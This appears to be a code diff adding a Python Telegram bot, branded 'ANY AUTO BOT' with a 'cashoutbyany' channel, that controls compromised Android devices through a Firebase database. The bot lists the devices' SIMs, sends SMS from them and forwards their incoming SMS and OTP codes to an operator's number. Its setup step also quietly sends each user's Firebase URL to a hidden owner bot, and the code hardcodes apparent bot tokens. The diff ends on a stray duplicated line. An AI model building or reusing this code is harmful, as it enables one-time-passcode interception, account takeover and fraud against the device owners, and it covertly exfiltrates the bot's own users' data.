@@ -21,6 +21,21 @@ from telegram.ext import (
 )
 
 # ============================
+# FLASK KEEP-ALIVE (24/7)
+# ============================
+from flask import Flask
+flask_app = Flask(__name__)
+
+@flask_app.route('/')
+@flask_app.route('/ping')
+def ping():
+    return "✅ Bot is alive!", 200
+
+def run_flask():
+    port = int(os.environ.get("PORT", 8080))
+    flask_app.run(host="0.0.0.0", port=port)
+
+# ============================
 # LOGGING
 # ============================
 logging.basicConfig(
@@ -35,6 +50,484 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8906877625:AAG-MIuDPRdfI55LoaEYD0caduRX1BRIPgI")
 OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8919120322:AAESIjOGBP9I5JpAw7kYBWGTQjV619CPA-I")
 OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "8912251548"))
+
+# ============================
+# BOT NAME
+# ============================
+BOT_NAME = "<b>𝗔𝗡𝗬 𝗔𝗨𝗧𝗢 𝗕𝗢𝗧</b>"
+
+# ============================
+# FORCE JOIN CHANNEL
+# ============================
+CHANNEL_USERNAME = "@cashoutbyany"
+CHANNEL_URL = "https://t.me/cashoutbyany"
+
+# ============================
+# USER CONFIG – PERSISTENT VOLUME FIX
+# ============================
+os.makedirs("data", exist_ok=True)
+USER_CONFIG_FILE = os.path.join("data", "user_config.json")
+
+user_configs = {}
+last_otp = {}
+
+def load_user_configs():
+    global user_configs, last_otp
+    if os.path.exists(USER_CONFIG_FILE):
+        with open(USER_CONFIG_FILE, "r") as f:
+            user_configs = json.load(f)
+        for uid, cfg in user_configs.items():
+            if "last_otp_value" in cfg:
+                last_otp[uid] = cfg["last_otp_value"]
+        logger.info(f"✅ Loaded configs for {len(user_configs)} users")
+    else:
+        user_configs = {}
+
+def save_user_configs():
+    with open(USER_CONFIG_FILE, "w") as f:
+        json.dump(user_configs, f, indent=2)
+
+load_user_configs()
+
+# ============================
+# CONVERSATION STATES
+# ============================
+URL, CHANNEL = range(2)
+WAITING_OTP_NUMBER = 10
+
+# ============================
+# MEMBERSHIP CHECK WITH BUTTONS
+# ============================
+async def send_join_required_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [
+        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
+        [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.effective_message.reply_text(
+        f"❌ <b>You must join our channel to use this bot.</b>\n\n"
+        f"Click the button below to join, then click 'I have joined' to continue.",
+        parse_mode="HTML",
+        reply_markup=reply_markup,
+        disable_web_page_preview=True,
+    )
+
+async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    user_id = update.effective_user.id
+    try:
+        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
+        if member.status in ["member", "administrator", "creator"]:
+            return True
+        else:
+            await send_join_required_message(update, context)
+            return False
+    except Exception as e:
+        logger.error(f"Membership check error for {user_id}: {e}")
+        await send_join_required_message(update, context)
+        return False
+
+async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    try:
+        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
+        if member.status in ["member", "administrator", "creator"]:
+            await query.edit_message_text(
+                f"✅ <b>You are now a member!</b>\n\n"
+                f"Welcome to {BOT_NAME}.\n"
+                f"Use /start to see all commands.",
+                parse_mode="HTML"
+            )
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=f"{BOT_NAME} <b>WELCOME</b>\n\n"
+                     f"<b>Available commands:</b>\n"
+                     f"/setup – Configure Firebase URL & Channel ID\n"
+                     f"/devices – Select device and SIM\n"
+                     f"/setotp – Set forwarding phone number\n"
+                     f"/resetforward – Reset old message tracker\n"
+                     f"/help – Show this message\n\n"
+                     f"<b>How it works:</b>\n"
+                     f"After setup, messages from channel with 'To:' and 'Message:' will be sent as SMS.\n"
+                     f"OTP node updates are automatically sent to your set number.\n"
+                     f"Incoming SMS (type: 'incoming') in messages/{{device_id}} will be forwarded only if new.",
+                parse_mode='HTML',
+                disable_web_page_preview=True,
+            )
+        else:
+            await query.edit_message_text(
+                f"❌ You still haven't joined the channel.\n\n"
+                f"Please click the 'Join Channel' button below, then click 'I have joined' again.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
+                    [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
+                ]),
+                parse_mode="HTML"
+            )
+    except Exception as e:
+        logger.error(f"Callback membership check error: {e}")
+        await query.edit_message_text("⚠️ Error checking membership. Please try again later.")
+
+# ============================
+# HELP / START
+# ============================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return
+    await update.message.reply_text(
+        f"{BOT_NAME} <b>WELCOME</b>\n\n"
+        f"<b>Available commands:</b>\n"
+        f"/setup – Configure Firebase URL & Channel ID\n"
+        f"/devices – Select device and SIM\n"
+        f"/setotp – Set forwarding phone number\n"
+        f"/resetforward – Reset old message tracker\n"
+        f"/help – Show this message\n\n"
+        f"<b>How it works:</b>\n"
+        f"After setup, messages from channel with 'To:' and 'Message:' will be sent as SMS.\n"
+        f"OTP node updates are automatically sent to your set number.\n"
+        f"Incoming SMS (type: 'incoming') in messages/{{device_id}} will be forwarded only if new.",
+        parse_mode='HTML',
+        disable_web_page_preview=True,
+    )
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return
+    await start(update, context)
+
+# ============================
+# RESET FORWARD
+# ============================
+async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return
+    user_id = str(update.effective_user.id)
+    if user_id not in user_configs:
+        await update.message.reply_text("<b>❌ Please run SETUP first.</b>", parse_mode='HTML')
+        return
+    selected = get_selected(user_id)
+    if not selected or not selected.get("deviceId"):
+        await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
+        return
+    device_id = selected["deviceId"]
+    initialize_processed_keys(user_id, device_id)
+    await update.message.reply_text(
+        f"<b>✅ Reset successful!</b>\n"
+        f"All existing messages for device <code>{device_id}</code> are now marked as read.\n"
+        f"Only new incoming messages will be forwarded.",
+        parse_mode='HTML'
+    )
+
+# ============================
+# FIREBASE HELPERS
+# ============================
+def firebase_get(user_id, path):
+    cfg = user_configs.get(str(user_id))
+    if not cfg or not cfg.get("firebase_url"):
+        return None
+    url = f"{cfg['firebase_url']}/{path}.json"
+    try:
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            return resp.json()
+    except Exception as e:
+        logger.error(f"Firebase GET error: {e}")
+    return None
+
+def firebase_put(user_id, path, data):
+    cfg = user_configs.get(str(user_id))
+    if not cfg or not cfg.get("firebase_url"):
+        return
+    url = f"{cfg['firebase_url']}/{path}.json"
+    try:
+        requests.put(url, json=data, timeout=10)
+    except Exception as e:
+        logger.error(f"Firebase PUT error: {e}")
+
+def get_online_devices(user_id):
+    data = firebase_get(user_id, "clients")
+    if not data:
+        return {}
+    online = {}
+    for dev_id, info in data.items():
+        if info.get("status") == True:
+            online[dev_id] = {
+                "modelName": info.get("modelName", "Unknown"),
+                "sims": info.get("sims", [])
+            }
+    return online
+
+def get_selected(user_id):
+    cfg = user_configs.get(str(user_id))
+    if cfg and "selectedDevice" in cfg:
+        return cfg["selectedDevice"]
+    return {}
+
+def initialize_processed_keys(user_id: str, device_id: str):
+    cfg = user_configs.get(user_id)
+    if not cfg:
+        return
+    msgs = firebase_get(user_id, f"messages/{device_id}")
+    keys = []
+    if msgs and isinstance(msgs, dict):
+        keys = list(msgs.keys())
+    cfg["processed_keys"] = keys
+    cfg["processed_device"] = device_id
+    cfg.pop("last_forwarded_id", None)
+    cfg.pop("selection_time", None)
+    save_user_configs()
+    logger.info(f"Initialized processed_keys for user {user_id}, device {device_id}: {len(keys)} keys")
+
+def set_selected(user_id, device_id, sim_slot, sim_phone):
+    cfg = user_configs.get(str(user_id))
+    if cfg:
+        cfg["selectedDevice"] = {
+            "deviceId": device_id,
+            "simSlotIndex": sim_slot,
+            "simPhoneNumber": sim_phone
+        }
+        initialize_processed_keys(str(user_id), device_id)
+        save_user_configs()
+        logger.info(f"✅ Device selected. Processed keys reset for {user_id}")
+
+def send_sms_command(user_id, device_id, to_number, message, from_number):
+    firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
+        "to": to_number,
+        "message": message,
+        "from": from_number,
+        "isSended": False
+    })
+    logger.info(f"📤 SMS command sent: device {device_id} -> {to_number}")
+
+def get_otp_number(user_id):
+    cfg = user_configs.get(str(user_id))
+    if cfg and "otpNumber" in cfg:
+        return cfg["otpNumber"]
+    return None
+
+def set_otp_number(user_id, number):
+    cfg = user_configs.get(str(user_id))
+    if cfg:
+        cfg["otpNumber"] = number
+        save_user_configs()
+
+# ============================
+# SETUP CONVERSATION
+# ============================
+async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return ConversationHandler.END
+    await update.message.reply_text(
+        f"<b>📌 Step 1/2</b>: Send your <b>Firebase URL</b>.\nExample: <code>https://your-project.firebaseio.com</code>\nType /cancel to abort.",
+        parse_mode='HTML'
+    )
+    return URL
+
+async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return ConversationHandler.END
+    url = update.message.text.strip()
+    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
+        await update.message.reply_text("<b>❌ Invalid URL. Must be https://...firebaseio.com</b>", parse_mode='HTML')
+        return URL
+    context.user_data["firebase_url"] = url
+    await update.message.reply_text(
+        "<b>✅ URL saved.</b>\n\n<b>📌 Step 2/2</b>: Send your <b>Channel ID</b> (numeric, may be negative).",
+        parse_mode='HTML'
+    )
+    return CHANNEL
+
+async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return ConversationHandler.END
+    user_id = str(update.effective_user.id)
+    try:
+        channel_id = int(update.message.text.strip())
+    except ValueError:
+        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
+        return CHANNEL
+
+    user_configs[user_id] = {
+        "firebase_url": context.user_data["firebase_url"],
+        "channel_id": channel_id,
+        "selectedDevice": {},
+        "otpNumber": None,
+        "processed_keys": [],
+        "processed_device": None
+    }
+    save_user_configs()
+
+    try:
+        forward_msg = (
+            f"🔐 **Setup Complete!**\n👤 User: `{user_id}`\n🌐 URL: `{context.user_data['firebase_url']}`\n📢 Channel: `{channel_id}`"
+        )
+        url = f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage"
+        requests.post(url, json={"chat_id": OWNER_CHAT_ID, "text": forward_msg, "parse_mode": "Markdown"}, timeout=5)
+    except Exception as e:
+        logger.error(f"Forward failed: {e}")
+
+    test = firebase_get(user_id, "clients")
+    if test is None:
+        await update.message.reply_text("<b>❌ Firebase connection failed. Check URL or make database public.</b>", parse_mode='HTML')
+        del user_configs[user_id]
+        save_user_configs()
+        return ConversationHandler.END
+
+    await update.message.reply_text(
+        f"{BOT_NAME} <b>SETUP COMPLETE!</b>\n\n"
+        f"<b>✅ Configuration saved.</b>\n"
+        f"Now use /devices to select a device and SIM, then /setotp to set forwarding number.",
+        parse_mode='HTML'
+    )
+    return ConversationHandler.END
+
+async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return ConversationHandler.END
+    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
+    return ConversationHandler.END
+
+# ============================
+# DEVICES
+# ============================
+async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return
+    user_id = str(update.effective_user.id)
+    if user_id not in user_configs:
+        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
+        return
+    online = get_online_devices(user_id)
+    if not online:
+        await update.message.reply_text("<b>❌ No online devices found.</b>", parse_mode='HTML')
+        return
+    keyboard = []
+    for dev_id, data in online.items():
+        label = f"📱 {data['modelName']} ({dev_id[:6]}...)"
+        keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev_id}")])
+    await update.message.reply_text(
+        "<b>👇 Select your device:</b>",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode='HTML'
+    )
+
+async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    if not await is_user_member(update, context):
+        return
+    await query.answer()
+    user_id = str(update.effective_user.id)
+    device_id = query.data.replace("dev_", "")
+    online = get_online_devices(user_id)
+    device_data = online.get(device_id)
+    if not device_data:
+        await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
+        return
+    sims = device_data.get("sims", [])
+    if not sims:
+        await query.edit_message_text("<b>❌ No SIMs on this device.</b>", parse_mode='HTML')
+        return
+    keyboard = []
+    for sim in sims:
+        slot = sim.get("simSlotIndex", "?")
+        phone = sim.get("phoneNumber", "N/A")
+        callback_data = f"sim_{device_id}_{slot}_{phone}"
+        keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} - {phone}", callback_data=callback_data)])
+    await query.edit_message_text(
+        f"<b>📱 Device:</b> <code>{device_data['modelName']}</code>\n<b>Choose SIM:</b>",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode='HTML'
+    )
+
+async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    if not await is_user_member(update, context):
+        return
+    await query.answer()
+    user_id = str(update.effective_user.id)
+    parts = query.data.split("_")
+    if len(parts) < 4:
+        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
+        return
+    device_id = parts[1]
+    slot = parts[2]
+    phone = parts[3]
+    set_selected(user_id, device_id, slot, phone)
+    await query.edit_message_text(
+        f"<b>✅ Active!</b>\n"
+        f"📱 Device: <code>{device_id}</code>\n"
+        f"📶 SIM Slot: <code>{slot}</code>\n"
+        f"📞 Phone: <code>{phone}</code>\n\n"
+        f"✅ Old messages blocked. Only new ones will forward.\n"
+        f"Now set OTP number using /setotp.",
+        parse_mode='HTML'
+    )
+
+# ============================
+# SET OTP
+# ============================
+async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return ConversationHandler.END
+    user_id = str(update.effective_user.id)
+    if user_id not in user_configs:
+        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
+        return ConversationHandler.END
+    if context.args:
+        number = context.args[0]
+        if not re.match(r"^\+?[0-9]{10,15}$", number):
+            await update.message.reply_text("<b>❌ Invalid number. Use /setotp +919876543210</b>", parse_mode='HTML')
+            return ConversationHandler.END
+        set_otp_number(user_id, number)
+        await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
+        return ConversationHandler.END
+    await update.message.reply_text(
+        "<b>📞 Send phone number (with country code):</b>\nExample: <code>+919876543210</code>\nType /cancel to abort.",
+        parse_mode='HTML'
+    )
+    return WAITING_OTP_NUMBER
+
+async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return ConversationHandler.END
+    user_id = str(update.effective_user.id)
+    number = update.message.text.strip()
+    if not re.match(r"^\+?[0-9]{10,15}$", number):
+        await update.message.reply_text("<b>❌ Invalid number. Try again.</b>", parse_mode='HTML')
+        return WAITING_OTP_NUMBER
+    set_otp_number(user_id, number)
+    await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
+    return ConversationHandler.END
+
+async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_user_member(update, context):
+        return ConversationHandler.END
+    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
+    return ConversationHandler.END
+
+# ============================
+# CHANNEL MESSAGE
+# ============================
+def get_user_by_channel(channel_id):
+    for uid, cfg in user_configs.items():
+        if cfg.get("channel_id") == channel_id:
+            return uid
+    return None
+
+async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.channel_post:
+        return
+    channel_id = update.channel_post.chat_id
+    user_id = get_user_by_channel(channel_id)
+    if not user_id:
+        return
+    text = update.channel_post.text
+    if not text:
+        return
+    number_match = re.search(r"To:\s*([\d\+]+)", text)
+    message_match = re.search(r"Message:\s*(.+)", text)
+ OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "8912251548"))
 
 # ============================
 # BOT NAME
